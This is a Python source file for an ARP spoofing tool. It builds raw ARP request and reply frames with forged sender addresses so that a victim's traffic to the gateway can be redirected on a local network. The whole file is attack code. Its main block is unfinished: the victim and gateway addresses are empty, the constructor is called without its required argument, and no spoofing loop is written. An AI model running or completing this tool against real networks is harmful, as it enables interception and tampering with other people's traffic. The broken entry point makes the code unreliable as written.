import socket 
import struct
import fcntl


class arpspoof():
    def __init__(self, interface : str) -> None:
        try:
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            self.sock.bind((interface, 0x0806))
        except PermissionError:
            raise PermissionError('You must be root!')
        except OSError:
            raise OSError(f'No such device {interface}')
        
        self.interface = interface
        self.arp_type = b'\x08\x06'
        self.oper_request = b'\x00\x01'
        self.oper_answer = b'\x00\x02'

        htype = b'\x00\x01' # Ethernet
        ptype = b'\x08\x00' # IPv4
        hlen = b'\x06'
        plen = b'\x04'

        self.part_of_payload = htype + ptype + hlen + plen

    def send_packet(self, isOperRequest : bool, SHA, SPA, THA, TPA) -> None:
        if isOperRequest == True: 
            oper = self.oper_request
        else: 
            oper = self.oper_answer

        packet = THA + SHA + self.arp_type
        packet += self.part_of_payload + oper
        packet += SHA + SPA + THA + TPA
        
        self.sock.send(packet)

    def recv_packet(self) -> bytes:
        return self.sock.recv(42)
    
    def get_target_mac(self, target_ip : bytes) -> bytes:
        SHA = self.get_own_mac()
        SPA = self.get_own_ip()
        THA = b'\xff\xff\xff\xff\xff\xff'
        TPA = target_ip

        self.send_packet(True, SHA, SPA, THA, TPA)
        reply = self.recv_packet()
        return reply[6:12]

    def get_own_ip(self) -> bytes:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packed_iface = struct.pack('256s', self.interface.encode('utf_8'))
        packed_addr = fcntl.ioctl(sock.fileno(), 0x8915, packed_iface)[20:24]
        sock.close()
        return packed_addr

    def get_own_mac(self) -> bytes:
        return self.sock.getsockname()[4]


if __name__ == "__main__":
    interface = ''
    victim_ip = ''
    gateway_ip = ''

    spoof = arpspoof()

    

    spoof.sock.close()
